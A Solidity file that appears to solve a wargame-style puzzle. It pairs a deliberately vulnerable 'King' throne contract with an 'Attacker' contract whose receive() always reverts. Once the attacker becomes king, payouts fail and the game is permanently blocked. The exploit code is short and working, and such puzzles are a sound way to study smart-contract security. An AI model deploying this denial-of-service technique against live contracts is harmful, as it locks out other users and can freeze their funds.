// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;
  
  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner, "lower prize");
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Attacker {

  function attack(address payable _victim) public payable {
    (bool sent, ) = _victim.call{value: msg.value}("");
    require(sent, "sent failed");
  }

  receive() external payable {
    revert("boooooooo");
  }
}